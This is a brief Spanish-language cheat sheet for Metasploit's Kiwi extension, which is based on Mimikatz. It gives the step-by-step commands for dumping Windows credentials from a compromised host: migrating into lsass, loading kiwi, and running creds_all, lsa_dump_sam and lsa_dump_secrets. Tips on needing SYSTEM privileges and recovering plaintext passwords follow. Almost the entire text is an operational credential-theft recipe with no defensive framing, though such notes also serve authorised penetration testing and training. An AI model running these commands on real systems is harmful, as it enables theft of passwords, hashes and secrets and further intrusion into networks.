Extensión de Meterpreter basada en Mimikatz para extraer credenciales.

• Obtiene passwords en memoria  
• Extrae hashes y secretos  
• Integrado en Metasploit

## Preparación

Migrar a proceso con privilegios:

	pgrep lsass 
	migrate PID

## Cargar Kiwi

	load kiwi

## Obtener credenciales

Credenciales en memoria:

	creds_all

## Dump de hashes (SAM)

	lsa_dump_sam

## Dump de secretos (LSA)

	lsa_dump_secrets


• Migrar a lsass.exe para mejores resultados  
• Requiere privilegios elevados (SYSTEM)  
• creds_all muestra passwords en texto claro si están en memoria  
• Alternativa directa a mimikatz.exe